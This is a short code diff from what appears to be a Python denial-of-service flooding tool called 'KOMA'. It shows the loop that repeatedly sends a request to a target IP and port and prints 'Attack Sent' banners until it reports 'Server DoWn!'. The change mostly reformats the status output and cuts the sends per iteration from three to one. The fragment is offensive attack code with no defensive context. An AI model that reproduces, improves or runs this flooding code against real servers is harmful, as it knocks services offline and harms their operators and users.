@@ -96,14 +96,8 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[★\033[96m]  \033[37m[KOMA\033[96m]  \033[33mAttack {0}:{1}  \033[95mSent::..{2}\033[0m".format(str(ip), int(port), xx))
-                s.send(str.encode(main_req))
-                xx += random.randint(0, int(packs))
-                print("\033[96m[★\033[96m]  \033[32m[KOMA\033[96m]  \033[92mAttack {0}:{1}  \033[92mSent::..{2}\033[0m".format(str(ip), int(port), xx))
-                s.send(str.encode(main_req))
-                xx += random.randint(0, int(packs))
-                print("\033[96m[★\033[96m]  \033[33m[KOMA\033[96m]  \033[93mAttack {0}:{1}  \033[96mSent::..{2}\033[0m".format(str(ip), int(port), xx))
-        
+                print("\033[96m[★\033[96m]  \033[96m[KOMA]  \033[95m{2}  \033[33mAttack Sent  \033[92m{0}:{1}\033[0m".format(str(ip), int(port), xx))
+                
         except:
                s.close()
                print("[!]          \033[31mServer DoWn!.\033[0m")
